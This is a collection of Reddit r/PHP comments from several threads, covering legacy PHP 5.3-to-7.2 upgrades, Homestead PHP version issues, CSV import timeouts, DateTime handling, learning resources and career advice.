Yes, I asked because I wanted the answer (or rather I wanted everyone to be aware of the answers). Don't be embarrassed - it is a very risky set-up, but it sounds like it is not your fault. I think version control is a much more of a pressing problem - you cannot realistically do something as substantial as several PHP major version bumps without it. 
Thank you. 
You should fix these problems - in the given order :) I had to work with such projects myself from time to time, version control was always one of the first things i introduced. Even if you do not have a local dev setup to run the code, the version control at least adds the ability to revert stuff and helps with reviewing changes in case something breaks and you do not notice immediately. And as a free bonus it gives you some sort of backup, at least for the source code.
All text editors have search and replace functionality. Notepad++ is busted in 2018.
True. The language is still far from newer, modern languages because of its age and the many... let's say questionable decisions made early in its life, but generally, it's well usable, the ecosytem is mature and it's being actively developed.
I just completed a 5.6 -&gt; 7.2 jump on a 10 year old codebase last week. phan really, really helped. I also used https://github.com/sstalle/php7cc as a second analyzer. The biggest headaches I ran into: * each no longer exists * count() requires an array or CountableInterface. This broke many things. * list() changed the order in which data are assigned to variables. This sucked. 
While likely unpopular, the easiest way to upgrade from PHP 5.3 to PHP 7.2 is by finding, and eventually working for a company that‚Äôs not ten years behind. 
It would make a great event for upcoming International Yak Shaving &amp; Bike Shed Building 2018 competition.
all of those are true but PHP is probably on the way out. technology like lambda functions (js or python) and go are rising on the "server " side , as serverless microservice becomes more feasible and comes into fashion. for better or worse most application logic is shifiting to the client side (i think this is actually a poor design choice but oh well). php is a bit of a dinosaur ...not quite yet but close
Came in here to say this. I took a single contract for Magento. Never again. I'm absolutely convinced that Magento was written by Java developers who chose to use PHP for whatever reason. I even went so far as to take a deep look at their code, and the deeper I went, the worse it got. You can get work done with Magento, but you're not going to enjoy it.
Bonus points: Programmer has been raising the issue and getting shot down for 5+ years.
I run 5.3 and 7.0 side-by-side. The 7.0 side is a public-facing Symfony app. The 5.3 side is our legacy e-commerce app that requires register_globals and is only accessible from local. We are in the ongoing process of migrating the 5.3 functionality to 7.0. The parts that haven't been migrated are called over http (actually fcgi, but that's just an optimization). I have a feeling that this is actually a bad idea, but it has yet to be proven so. 
&gt; 7.2 isn't much different than preceding 7.x releases. I disagree with this. 7.1/7.2 add a bunch of warning for various things like implicit number conversion. Any ‚Äúlegacy‚Äù code has a good chance of being hit by this. (Yes, obviously these are not shown in production but you still need to fix them on dev. And many frameworks like Laravel will bail out on any warning or notice, breaking your app.)
Haha I'm about to build a new installer for our web product (currently built with 7.0.7, moving up to 7.2.x) When I saw your reference about foreach, I almost had a heart attack as we use those EVERYWHERE lol..... then I realized it was about standalone each(). We always perform testing before deployment, but I just did a scan of our entire code base to make sure we had no each() functions in our code.... all good!
I wasn't aware of this. Could you please link me some details? I'm planning the jump from 7.0 to 7.2 on an app this summer and don't want to be bitten. For OP: There is one other breaking change as of 7.2 that could be an issue: mcrypt is gone. Most projects should no longer user it, but you may need a reasonably modern version of PHP to get the updated code running. Consider upgrading to 7.0 before going on to 7.2.
PHP has lambda functions... http://php.net/manual/en/functions.anonymous.php
I'm not alone, good to know. 
Years ago, `foreach` would duplicate every element as you looped through it, while `each` did not. PHP is a lot cleverer than that now, and does not duplicate any elements unless you change them.
My anecdata is that if the situation is due to company culture, you probably can't change it.
nope, older versions would just escape it.
But from 5.6 -&gt; 7.x it's worse/different http://php.net/manual/en/migration70.incompatible.php#migration70.incompatible.foreach
Magento2 goes for a good rate depending on ones geographical location.
The only thing I remember having issues with that were a huge pain to deal with was relating to APC, and that was specifically because we were using the userspace cache (kind of similar to memcached/redis) which changed or went away or something in 5.5 (?). I've also encountered a couple of extensions that didn't get updated, but those were generally easy to work around. Almost no actual code needed changing.
http://php.net/manual/en/migration72.php has a fairly detailed list of potential BC issues. Many of which amount to "you were getting lucky with undefined behavior, stop that"
I would install Git both on server and local. Then on local open all errors. Upgrade PHP to 5.4 and test run etc. If everything is okay upgrade the server to PHP 5.4. Then repeat with 5.5, then 5.6, then 7.0, then 7.1, then 7.2. Also log all errors in the server, both PHP/IIS and MySQL.
I encountered this issue in 2009, and according to stack overflow the behavior hadn't changed. I'm certain mysql_real_escape_string() has always returned an empty string without a connection present. https://stackoverflow.com/questions/10339373/php-mysql-real-escape-string-returns-empty-string
Aww yes, I misspoke. I fixed that in the original post, thanks for pointing this out.
yeah, so if you're still on 5.3 and going to 5.6 you could encounter this issue. 
You could have just installed apcu ("u" stands for userland).
I seem to remember that wasn‚Äôt an option at the time for some reason, but it was long enough ago that I don‚Äôt remember the exact details. The actual solution to the problem actually ended up being solved in nginx. 
The problem isn't Carbon, it's the extension of it. Adding functionality is okay in minor versions.
It depends, if You f.ex. still run mysql_* then You may need to compile that module for php 7.
I'd do source control then dev server then testing. Not only for imprtsnce but also LEO. Both to implement and sway management (of a firm that would as low this to exist in the first place )
semver mentioned that - if you do not change anything in the public API but just bug fixes, they are considered as __patch__ bump. - if you add new functionalities, add additional optional parameters/configurations to your public API, but backward compatible, they are __minor__ bump. - if you add new functionalities and changed the public api such that clients need to change/recompile, they are __major__ bump. To me it feels more like a minor bump for Carbon, since it's optional parameters. It's jssengers issue on depending Carbon in a "locking" manner. They should be the one responsible for it. --- Think about how laravel added all those new parameters in their framework, yet still just bump the minor versions since it does not break clients who uses the public api, though they do include change log on what to change if you have extended their core classes. They are not considered major upgrades.
There is no best, different contexts have different priorities, e.g - the priorities if you work at a bog standard web agency that bangs out X number of sites a year are different from someone who works at some company that is using PHP to power a software product, that is different again from some guy who runs a website they started years ago and so on. And then even comparing within the same narrow context, there is still no best, if you bang out X number of sites a year at some agency is really doesn't matter whether you use Symfony, Laravel, CakePhP, etc, the difference between these things is frankly mostly subjective. If it is for your own project, if you are competent you don't even need a framework (you can literally build 80% of one with Composer, Packagist, etc). Or you might use a different framework than the usual Symfony/Laravel, etc, because the main reasons to use those within an agency type scenario is basically an irrelevance if it is for your project (training, consistency, hiring and stuff to make banging many projects, efficient), so you might go with Slim or something. If you really want to talk about meaningful differences (higher pay, different tier of performance, greater variety of uses, etc), then you have to go further than comparing PHP frameworks, and look at other languages.
Json_decode works a bit different too
&gt; good rate Technically, I think that's "Hazard Pay".
There‚Äôs truth to that, but v2 is a much better platform than 1.x ever was.
It's not hard to address the most important ones before you start the upgrade. Do a git init and commit everything, set up a new VM, and then go.
Are you talking about Angular v5 or AngularJS?
Yep. File an issue to jessenger and ask them for a fix.
`each()` and `foreach()` were both added in PHP4. `each()` wasn't meant for iteration though - it was meant as a [companion to `list()`](http://php.net/manual/en/function.each.php) mostly to be used with another iterator. That style of usage simply fell out of vogue for better patterns.
Stripe is by far the easiest. And cheapest. If you want a bit more control as well as the front end views then Laravel Spark basically scaffolds subscriptions for you. You just have to use Laravel and Vue. Also it costs $99 per site or $299 for unlimited.
#1 Priority: Get rid of Windows. Seriously. Rubbing an internet-connected server on Windows is just asking for trouble. Worst-case scenario, you could run it on Docker for Windows, but even that would make me extremely nervous. As for the upgrade, the breaking changes are fairly minimal. I would suggest you simply upgrade php in your development environment and re-run your test suite and see what fails, but sadly I think I know what the response to that would be! Still, best bet is to just try it out and see.
I wish *more* programmers would quit from these terrible companies. There are always better jobs out there... Part of me thinks the ones that stay are actually part of the problem. They haven't upgraded their skills since 2001.
I'd support this. I don't have any time to write an RFC or work on an implementation, though. I think that's the crux of the issue here; it's a large change that will require a lot of work.
but it means you can never extend a package's class on the possibility a signature change would break your implementation? (Not saying your right or wrong - just highlighting it)
Wow, I made 70/year in my first year as a Django dev in DC. I think you should look for remote work or something. That‚Äôs way too low. 
The competition is fierce. I was repeatedly told that, when I heard back at all, due to the overwhelming number of applicants, I didn't make the cut. Rarely made it to an interview. In ~6 months at ~2 applications per week, I think I had 3 interviews. I'd be happy to PM you a copy of my resume if you want to take a look.
Sorry I‚Äôm not in a position to hire. But try https://adhocteam.us. I worked there until recently (remote work is not for me). They were great. Highly recommended. 
I wasn't asking for a job. =P Thanks for the link. I'll check them out.
Nobody ever _really_ wants paypal, they just put up with it because of stupid user requests.
share some site for learning php and mvc model ...thankyou
Do you use unit testing?
Check out some youtube channels, also this -&gt; https://laracasts.com/series/php-for-beginners , its free, there are couple of courses there , which are 100% free, and not only Laravel related. Have fun with the language. 
Holy fuck, Have you just considered quitting instead?
No
then how come it starts working after i manually remove the errant ? from the symfony files. 
For me it sounds more a vagrant/vbox problem than a symfony one. I had lots of problems with npm writing to disk from inside vagrant into the shared folder. You should try docker üòÄ
if it was a vagrant/vbox problem the manual removal of ? from symfony files should not have solved the problem. the fact that i can solve by problem by editing symfony files points towards it being a symfony issue.
No, the problem I had is that files stored from vagrant to shared folder were corrupted, so that would explain the '?' that you are speaking of. 
 public function __construct(string $path, array $defaults = array(), array $requirements = array(), array $options = array(), ?string $host = '', $schemes = array(), $methods = array(), ?string $condition = '') what would the purpose of having ? in this case. every time an app is made it is made with this line. could you just make a new laravel app in homestead and see if you get the same error. 
Well, there are a lot resources on the internet for this. **thenewboston** offers a wide range of video tutorial online for free on various web technologies such as Javascript, Ajax, PHP, JQuery. It has published over 200 video tutorials to learn PHP for free. The video collection covers all the concepts required to learn PHP. I recommend [this course](https://www.youtube.com/playlist?list=PL442FA2C127377F07) without a miss.
yeah, got it . i put in a phpinfo() in the web.app file and it showed that its using v7.0.24!
How about linking to [semver.org](https://semver.org) when referencing it?
Honestly just start small and do the most basic shit with it. Personally, when I started out I spent most of my initial time just building out routes in the web.php file that returned simple views, then built up with more templating in blade, and really mastered that. Adding in authentication is easy as hell with the Auth class, so I did that, then I wrote a controller to handle my routing, then I added in the authentication to "lockout" some views by using middleware (honestly it's like 1 line of code but seemed way more complicated), then I started injecting things like the username into the views, then I added some more fields into the user table, and then injected those into the views, then I added the ability to change things like your name, your city, etc. Then I built up "admin" views to display all info about users, and just kinda kept building up slowly piece by piece. I'm a visual learner, and I love laracasts, but I felt like I was missing something here and there. Like I could follow the videos, but changing things is where I really learned the ins and outs. I still have a LOT to learn, but i hope this kinda gives you some hope that you're not alone. Laravel just does a lot "for you" at the beginner level and that. An be kinda confusing until you start to see how it all links together. And honestly, I sat in bed re-reading the documentation for a good number of nights. As I was watching laracasts, and trying different things out, I slowly started making the connections as to how things worked. Best of luck man, DM me if you ever need any help!
Agree, there‚Äôs no reason for any of these utility classes *not* to be `final`. 
Just wanted to add another thing, but there are like 3 ways of doing everything in Laravel, and they are all "the right way." Like getting the signed in user can be: Auth::user(); $request-&gt;user(); auth()-&gt;user(); All will work, so just don't worry about it at first
Yep thanks. Was typing it while on commute, didn't have time to link it up
Like everyone has already said, its super subjective and depends on what you work well with. Saying that, check out http://cakephp.org/ - may not be as big as others, but our community is super supportive and awesome. Maybe it is one that you could work with, maybe it isnt :) Wont know until you have a proper look and try! 
If you already understand the basics, have read up on [phptherightway.com](http://www.phptherightway.com) recommend getting an actual job as a software engineer in a company that is using PHP. Spend a couple of years building and maintaining projects in closed source. Spend a couple of years maintaining and contributing to open source projects. Get a feeling for different open source communities and the difference in quality between closed and open source projects. If you are lucky, you will work in a company with excellent engineers. If you decide to contribute to open source, you can immediately work with - and have your contributions reviewed by - excellent engineers. Be patient, attend meetups and user groups, talk to and exchange ideas with other people. Fail, and learn from your failures. Attend conferences. Read books. Follow developers you admire on Twitter. There are a lot of people interested in becoming software engineers, as it is a highly paid profession. There are also a lot of people taking ‚Äúsummer camps of code‚Äù, then work for a year, demand a senior title, wait another year, become promoted to Engineering Manager. There are companies having trouble recruiting, especially in cities where everyone is looking for engineers, which prematurely promote engineers. Do not fall into the trap of becoming - or being led by - an [expert beginner](https://www.daedtech.com/how-developers-stop-learning-rise-of-the-expert-beginner). If you are interested in becoming a true professional, I can recommend to watch [*Jiro dreams of Sushi*](https://youtu.be/I1UDS2kgqY8): it‚Äôs a great example of humility and constant improvement ([*kaizen*](https://en.m.wikipedia.org/wiki/Kaizen)). At Jiro, an apprenticeship takes 10 years. There is no free or paid course that can replace real-life experiences. There are no shortcuts. 
Non-Mobile link: https://en.wikipedia.org/wiki/Kaizen *** ^HelperBot ^v1.1 ^/r/HelperBot_ ^I ^am ^a ^bot. ^Please ^message ^/u/swim1929 ^with ^any ^feedback ^and/or ^hate. ^Counter: ^154776
**Kaizen** kaizen (ÊîπÂñÑ), is the Japanese word for "improvement". In business, kaizen refers to activities that continuously improve all functions and involve all employees from the CEO to the assembly line workers. It also applies to processes, such as purchasing and logistics, that cross organizational boundaries into the supply chain. It has been applied in healthcare, psychotherapy, life-coaching, government, banking, and other industries. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/PHP/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^| [^Donate](https://www.reddit.com/r/WikiTextBot/wiki/donate) ^] ^Downvote ^to ^remove ^| ^v0.28
You do have a test system, it just happens to be the same as your production system üôÇ
I would kick out Wordpress and rather put Magento on that list. Pays way more, and you don't have to deal with as shitty codebase as Wordpress'.
&gt; is this right way? In this context, yea &gt; How to check if error has occured? When you caught an exception? :)
Actually i am inserting emails in db from csv files, sometime it gives 500 error code and breaks code, so i wanna catch that..
Check apache/nginx logs if you get error code 505.
Instead of catching, it started giving max execution time exceeded errors :( 
Exceeding execution time is a fatal error, not an exception. It can not be caught, unlike some other errors (see throwable interface) You need to increase the max execution time setting either in the ini or via ini_set. Google should have told you all of that.
yes, i have googled, is it good practice to do so?
try this: turn off caching for that page - use the accepted answer from here: https://stackoverflow.com/questions/13640109/how-to-prevent-browser-cache-for-php-site and at the end of your loop use flush() - you may have to use ob_flush() too this will cause the script to send output at the end of each loop instead of at the end of the script. you wont get the timeout then. 
My suggestions for you is to: 1) Create an account on Stackoverflow and answer/ask questions on: https://magento.stackexchange.com 2) Read Inchoo's Blog: http://inchoo.net/blog/ 3) Use Magento Template Hints: https://github.com/AOEpeople/Aoe_TemplateHints 4) Make sure you know everything from: http://devdocs.magento.com/ (also you may search for Magento 1.9.* docs) 
/r/phphelp
You forgot Magento for e-commerce. But there's also WooCommerce for that (good for smaller websites with a few products, wordpress based)
it gave timeout error, plus it shows page is loaded while script is running in back, user will think his file is uploaded, he will move on and script will break.
The 500 is a http response code. It's not an exception, and so nothing you can catch. You need to find out what is causing it and fix that at source.
Running http requests that take more than 30 seconds to run? No, that's not good practice. But unless you want to get into offline processes and queues, it may be all you have to work with for now.
But then you can't claim to have known PHP well before learning Laravel.
The main problem you probally have is having a non-performant way to work with the data. I recently had to work with a HUGE csv my self, so let me throw in some useful information and tips for you. First off: If you load the whole file.. you will probally overkill your RAM and at least will make it suffer a lot! So you probally want to think about itterating over each line seperatly and doing a specific action. You also can use some extern help tools like [PHP CSV League](https://csv.thephpleague.com/) That would look like somehow: ``` $file = new \SplFileObject($pathToFile); if (!$file-&gt;isFile() || !$file-&gt;isReadable()) { throw new \Exception("..."); } // Set of configuration like $file-&gt;setDelimiter(';'); for semi-colon seperated csv files $file-&gt;.. $file-&gt;.. $file-&gt;.. $reader = Reader::createFromFileObject($file); $external_variables = 'Just to show how to get external variables if needed'; $another = '1337'; $reader-&gt;each(function($row, $offset, $iterator) use ($external_variables, $another) { // We now have the first line within the $row, $offset starts at 0 // Since we only load one line only, it's much more performant. // Instead of doing two Queries, you may want to optimize your sql query too // Since you only want to insert/update data, I would suggest you using // the "ON DUPLICATE KEY UPDATE‚Äù syntax // So you can do a normal INSERT and on the "ON DUPLICATE KEY UPDATE" // you can do the additional "app_id" step if needed // Imagine that EVERY step you do can be a huge thing since you have to probally have to store // everything in the RAM }); ``` For testing purposes I tried storing 10 Million `rand(10000000, 9999999)` random numbers into an array and then check how much memory consuming it has. It went from ~6 MB to ~550 MB :D Also trying to do the same, but instead of adding a number into the memory, I would do a SIMPLE `SELECT user_id FROM user WHERE user_id = (int)$user_id LIMIT 1;`. It took approx. 30 minutes to finish. With just a simple select query inside a indexed user table!!
Don't knock rubbing servers until you've tried it `:=)` 
I am also using a package, it get 250 rows at a time, so I am not getting all rows at a time, 
Thankyou..
Kaizen is management related activity kai mean continue Zen mean improvement... 
The performance of your PHP website also depends on the PHP version, stack or caching services you are using. If you enable the caching services, like memcached and CDN service, you will see a significant boost in performance. Also, what PHP process manager you are using. PHP-FPM has proved to improve performance more than others out there. For example, when tested on DO 8gb server with PHP 7 for Symfony 3.2 on [Cloudways PHP MySQL hosting](https://www.cloudways.com/en/php-cloud-hosting.php), here were the results: https://imgur.com/a/tXnTv
^(Hi, I'm a bot for linking direct images of albums with only 1 image) **https://i.imgur.com/No8Kmde.png** ^^[Source](https://github.com/AUTplayed/imguralbumbot) ^^| ^^[Why?](https://github.com/AUTplayed/imguralbumbot/blob/master/README.md) ^^| ^^[Creator](https://np.reddit.com/user/AUTplayed/) ^^| ^^[ignoreme](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=ignoreme&amp;message=ignoreme) ^^| ^^[deletthis](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=delet%20this&amp;message=delet%20this%20dv0c2cy) 
using flush you can output and it goes to the screen each time it gets to the flush statement. page will look like its still loading till it gets to the end eg echo ‚Äòprocessing‚Äô; flush(); foreach () { // do stuff echo ‚Äò...‚Äô; flush(); } echo ‚Äòdone‚Äô; 
oh, okay, btw i improved my sql to the extent i can, and its working now..
Oh, that explains all. The? Are for php 7.1, yes
now that next question i put the php: "7.1" in my homestead.yaml file - but the app still runs using php v.7.0
Where have you executed the composer? 
Is there a better tool that searches through tons of files almost instantly?
thankyou..
And what do you have on your composer.json?
 "require": { "php": "&gt;=7.1.3", "fideloper/proxy": "~4.0", "laravel/framework": "5.6.*", "laravel/tinker": "~1.0" },
There you have it! You are asking for php &gt;= 7.1...
Because you have php7 installed on you vagrant. You cannot ask for php to composer. Php is installed on you environment... üòÖ üòÖ üòÖ 
Just be careful though, Laravel doesn't use Semantic Versioning for their libraries: https://laravel.com/docs/5.6/releases &gt; Laravel's versioning scheme maintains the following convention: paradigm.major.minor. 
OOI, what were you trying to count() that wasn't an array or Countable?
umm...but when i run php -v in my vm it shows that php v7.1.10 is installed on vm
Aiks, thanks, didn't know it!
Ok this maybe because that homestead has two php or more php versions and nginx is not calling the good one
As a freelancer, I've actually chosen to *specialise* in legacy systems. There might be 'better' jobs out there in terms of technology stack, but there's so much business-critical code which is running on PHP 5.x (often as far back as 5.1). I do keep my skills up to date by using 7.x for any greenfield projects, but there's a huge market out there for people willing to work with older stacks. 
Do you use this package and want to upgrade from 3 to 4? Rector set can help you with few cases: https://github.com/rectorphp/rector/blob/master/src/config/level/nikic/php-parser40.yml
There is a refactor helper built on top of nikic/php-parser that helps you upgrade to the newest version of nikic/php-parser, right? :-)
Your Homestead VM has multiple PHP versions installed. Inside the VM you can navigate to /etc/nginx/sites-available/ and edit the config for the site you are currently trying to get running. There will be a line that starts with "fastcgi_pass" this line needs to be edited. Instead of pointing to the FPM socket for PHP 7.0, change it to point to the socket for 7.1 or 7.2.
Thanks a ton for the great list of resources.
&gt; good for smaller websites with a few products It's actually just fine for just about any number of products. Maybe Magento is larger in your market. Around here it's pretty rare when compared to the number of projects from my list.
&gt; You want to shit on WordPress because of god-knows-what? Fine. That would be a great academic conversation. And an academic discussion is not what OP is probably digging for. Magento might pay well but it - from my experience in my market - doesn't have near the amount of work as the rest of the tech on my list.
typically, null
There's a steep learning curve if you don't know Symfony 3, but [Sylius](https://github.com/Sylius/Sylius) is pretty powerful.
Well, I personally prefer Laravel because [Laravel Development](https://www.laitkor.com/services/laravel-development/) its Easy. t supports many development environments and adjusts itself based on the appropriate platform where the app is running. Laravel libraries are supported by autocomplete features which are not found in other popular PHP frameworks. 
The work you are doing is amazing.
This is true in lots of ways, but then they take massive steps backwards in others. I'm looking at you, knockoutJs.
Yeah it would be things where null was an acceptable value. I think there were instances where an ORM was asked to get all results matching X which returned either an array of results or null. In PHP 5.6 you can just count($result) and null would return 0. Not so in 7.x!
Oh God... my sympathies.
I have my Scrum master cert. I love scrum and agile. Totally worth it in my opinion, but it really depends on where you work. If the whole organization from top to bottom doesn't buy in then you will have a lot of friction and conflict. 
To try to improve I would suggest being relentless in writing tests for every class. Whenever the design has problems, it will very quickly become difficult to write tests for, so it's self-reenforcing.
500 is a server error so just look into the error log of the webserver you are running online
Good luck with your Magento Career. I hope you'll enjoy it. I added a new link, the Magento subreddit. This is a good place to find Magento news and to ask questions.
'c' does not seem to be an accepted character for the $format parameter in DateTime::createFromFormat, [according to the docs](http://php.net/manual/en/datetime.createfromformat.php) It also says "In **most cases**, the same letters as for the date() can be used." But yeah, I would've thought it'd be possible too. 
yaml is not appropriate for a configuration file that's edited by humans as whitespace is significant.
hmm okey, i will hve to figure that out. I have never done that.
DateTime also accepts an ISO string directly without having to specify the format: new DateTime('2018-03-01T00:00:00+00:00');
can you please explain what exactly you want to do? why do you need a current time in various running stages of your application?
Fly, you fool. Magento devs can make quite a bit og money, mostly because no one wants to work with it, with good reasons, same as COBOL. This is not a job opportunity, it's a trap.
See https://stackoverflow.com/questions/1475297/phps-white-screen-of-death. 
CSM here - if you can get your employer to pay for it, that means there's sufficient interest/investment from the company to use Scrum/Agile in some of their projects. That means you get the cert + experience, that you can leverage for future jobs. Otherwise, you get the cert, but you'll have a hard time demonstrating your actual experience in Scrum. Being a "real" scrum master goes deeper than performing rituals and knowing what a story point is.
Before you do, please read https://martinfowler.com/bliki/CertificationCompetenceCorrelation.html. 
To be honest, I always worked on the assumption that createFRomFormat used the same symbols, and I discovered just now that the createFromFormat had a symbol table.
Yep, the DateTime constructor does a pretty good work at guessing the input format.
&gt; litteraly I rank this spelling error second for irony after "your a idiot".
&gt; I found the quirk fun. You're weird.
 define('NOW', time());
IIS? Works reasonable well with PHP 7. MS SQL Server on the other hand would require reasonably new Windows. (Windows Server 2012 works OK! Even with PHP 5.3). So try to upgrade infrastructure first, if you are stuck on old hw/sw. As for PHP 5.3. Well first thing to do is check up php.ini config file, to see how much old PHP4 compatibility settings is there enabled ;)
&gt; You're weird. You have no idea
Meh. I wrote it as in french, my bad.
As well as wondering what /u/Egging_McNut already asked: are you aware of the idea of a monotonic clock, and specifically that PHP doesn't have one? (Unless something's changed recently) A monotonic clock is one that is guaranteed to never give a time that is lesser than one it's already given: ie it'll never move backwards. That seems like it'd be true of any non-broken clock, but it isn't: The system clock on your system that PHP pulls from *does not* make this guarantee. If your computer uses NTP or otherwise synchronizes time with anything else it's entirely possible that $a = new DateTime(); &lt;stuff&gt; $b = new DateTime(); will have `$a` be a time that comes *after* `$b`. You should be aware of this edge case when writing any code dealing with time comparisons.
Sure, modern free text editors like Sublime Text, VSCode, Atom do a good job. So do free and not-modern unix tools like `find` and `sed`. I also really enjoy [the silver searcher](https://github.com/ggreer/the_silver_searcher).
If your target config writers are having trouble with whitespace, definitely pick a different format that they can manage.
Usually when this happens to me it's because my host doesn't support short tags, have to turn them on in php.ini Could also be .htaccess or an Apache conf setting different between your local host and the remote host.
hmm...
&gt; (Unless something's changed recently) Watch for `hrtime()` in PHP 7.3.
Codecourse
We use carbon as it‚Äôs really helpful when dealing with converting to and from ISO dates. It also has a factory so you can just mock calls and do a true unit test. 
+1 for British accent. Thanks !
There is a [twitch community](https://www.twitch.tv/communities/php) for PHP devs. Not super active but most Twitch streamers also have a YouTube account.
:D
An example is if you are making several calls to different services. Trying to boil some to something simple: if ($usersService-&gt;isExpiredUser($user)) { exitSomehow(); } else { $usersService-&gt;removeExpiredUsers(); $actionService-&gt;userDoThing($user); } // usersService.php function isExpiredUser($user) { $now = new DateTime(); return $user-&gt;expiry &gt; $now; } function removeExpiredUsers() { $now = new DateTime(); $query = 'DELETE FROM users WHERE expiry &lt; ' . $now; // etc } In this scenario both methods set $now independently, which mean the time could change between those calls. This would put the application into an invalid state as it would be trying to call userDoThing() with a user that no longer exists.
lol that random chart
I‚Äôm used to having to dig for good php content :), so I‚Äôll check it out. Thanks !
ok first of all - why should "beExpired" has to be something to be figured out a lot. if you want to expire a user (on whatever condition) set him "BOOL expired=true" and that's it. and even if that is not an option, you probably rely to some database-backend for persisting user states and just let them handle such things.
I'll just leave you with this quote: "If a famous martial art master were to certified people as Kungfu Master after a 2 days overpriced course, how would a real practitioner should feel about it?"
I'm wondering if there is actually a good reason (for at least a BC break correction) -- Time is incredibly tricky. It's come up before on the Internals board before: https://externals.io/message/99608
Check out [larastream.com](https://larastream.com/explore) (mostly focused on Laravel ecosystem).
your litteraly a idiot than
If my company pays for it, I don‚Äôt care. It‚Äôs just another thing I can add to my resume (and do because my company paid to get me certified even though I had been managing 4 teams for them already).
You are welcome! :)
You are welcome! :)
https://www.reddit.com/r/laravel/comments/80kwsq/im_able_to_ping_my_local_homestead_site_but_it/dv0nalt/
Be on the lookout for the yearly November discount (around Nov 23rd). Yearly and forever plans are half the price.
There's a [Laracasts' YouTube channel](https://www.youtube.com/channel/UC3s5g0_lyZYOu8Jjo27udAQ) where [Jeffrey Way](https://twitter.com/jeffrey_way) (Laracasts' creator) uploads his weekly streams and cross-posts some of the site's content.
This particular example is arbitrary. I‚Äôm just trying to show how several different actions in an app might need the current time and I would like a graceful way to freeze the time for the duration of the request. I think I need to go and find a better way to rephrase the problem. I might see if I can extract a more concrete example from my current apps.
Did I hear a rumour that was canned after the whole Spectre/Meltdown thing?
Just found $_SERVER['REQUEST_TIME'] is a thing. That could be an option to use for ‚Äúnow‚Äù everywhere
You may need to give some more background, but in any event, I am not sure it is on-topic here. There are probably subs for advertising F/OSS projects. 
This is a bullshit answer. It's akin to saying... "If your assembly writers are finding they're not as productive as your python developers, definitely pick a different language". No assembly developer will ever find themselves as productive as a python developer. The decision to use assembly is fundamentally solving a different problem than the decision to use Python. likewise with the decision to use in vs yaml. You're solving a fundamentally different problem. If you're looking for a human editable configuration format, yaml is not it.
Seems like an advertisement. Where is the code?
Phew, not good. I wonder why they seem to be doing their own param binding rather than getting PDO or MySQLi to do it? 
Those poor Python developers must never be able to get anything productive done either, always dealing with whitespace issues! üòâ
Yes mate!
Are they really comparable? I haven't' used Sylius but it seems like just ecommerce libraries for Symfony to me. Whereas Prestashop is an off the shelf product that just happens to be built on Symfony. So if you need a very custom built ecommerce site and you want to develop on the Symfony framework then Sylius might be good, but if you just need a standard ecommerce site and can utilise a lot of standard features then Prestashop is quicker and easier to implement and will serve 99% of use cases. Is this a fair assessment? 
Also, to prevent Time Zones ruin the show for you because you run the app on a server (in a container or whatever) that's configured differently, you could do: &gt; $utcNow = new DateTimeImmutable(null, new DateTimeZone('UTC')); This can be then saved to the DB (which can then be replicated around the globe with that UTC time), and rendered in the user's time zone by your view layer.
So at this point, I'm the employer. I'm trying to work this into how I deal with my subcontractors. For someone who doesn't really have someone to learn from directly, I kinda feel like i'm at a hard place to start‚Äîfigured maybe the certification might be that.
You have a valid point with your use case. You could also leverage your DB more: Let it be the Single Point Of Truth. Let the database - and only the database - know when a user is expired: function isExpiredUser($user) { $this-&gt;query("SELECT NOW() &gt; expiration_date AS is_expired") return $user-&gt;expiry &gt; $now; } That's better, but now still the PHP app does half the logic: Only the app knows how to compute expiration. What if you want a Ruby or a JavaScript app access your data via an API? You can put the logic how to calculate expiration into a view: CREATE OR REPLACE VIEW user_view AS (SELECT *, NOW() &gt; expiration_date AS is_expired FROM user); Now, the business knowledge (when is a user expired?) is centralised in your Single Point Of Truth - the database. It doesn't matter who queries it, the answer whether a user is expired will always be the same, and correct.
Traversy Media does good quick explanations of all sorts of languages and technologies. Php is one of the ones he‚Äôs made less videos on but still lots of content.
He does use 'perfect' (and similar) a lot, which sort of set me off at some point and has gotten distracting. Good content though. Too bad a lot of the Laravel-related software is MacOS only.
FFS. What the hell do you expect us to do with this? 
oh no
Get a second, third and fourth mortgage and throw them all away by using PHP to mess with Cryptocurrency, apparently. *facepalm*
Smack him for the Hungarian Notation?
It does sound like generators and yields could resolve this problem. I had these bookmarked, hope it helps: https://blog.programster.org/php-generators https://markbakeruk.net/2016/10/08/php-generators-sending-gotchas/ 
Is that what he's doing?
https://imgur.com/gallery/VyMu86F
No, it is not.
i really didn't see it, sorry for that..
Valet is
Symfony offers a component called [Workflow](https://symfony.com/doc/current/components/workflow.html).
Not testable unfortunately :(
I like https://www.youtube.com/user/PHPRoundtable, they have interesting talks about php 
Bookmarked to put in Certificates section of my resume. 
Ssme situation at a place i started at. small small changes, little by little is easier to make happen.
youtube.com/user/grafikarttv if you speak French 
That's essentially using a global variable. I would prefer to go the injection route. 
Codecourse; back when it was phpacademy, was the first channel I learned web development and PHP from. Alex is an amazing guy. 
It made me laugh in the from scratch series when he said "I like to leave lots of line breaks, otherwise it gives me anxiety" 
It off interest, what are the non php YouTubers you watch?
Do you (or anyone else here) have any experience with this? I read some of the docs, and I'm not sure its quite what I am looking for. Here's some pseudocode of an idea I'm currently working on: (new Workflow('Process Invoices')) -&gt;stopOnFailure() -&gt;stopOnException() -&gt;then(new CollectOrdersReadyToInvoice()) -&gt;then(new GenerateInvoices()) -&gt;then( (new SplitWorkflow('Process Invoices')) -&gt;then(new PostToQuickbooks()) -&gt;then(new GenerateExcelSummary()) -&gt;then(new EmailCustomer()) ) )-&gt;execute(); So basically I am defining steps of work in separate classes, and then using a fluid interface on my Workflow to define the steps in the workflow in very simple way. So basically, * Tell the workflow it should stop when a step fails or throws an exception * Collect orders from the model. * Generate one or more invoices from the orders. * You may have multiple invoices, and the remaining workflow steps need to run per-orders, so I inject a SplitWorkflow which will run it's steps for each input it is given. * For each invoice post it to Quickbooks * then Generate an Excel Summary sheet * and then email it to the customer. No step is all that complex, and each is easily tested. Workers have a defined Input interface and Output interface, and most concrete IO types implement both interfaces so they can be returned as output and used as input to the next step. 
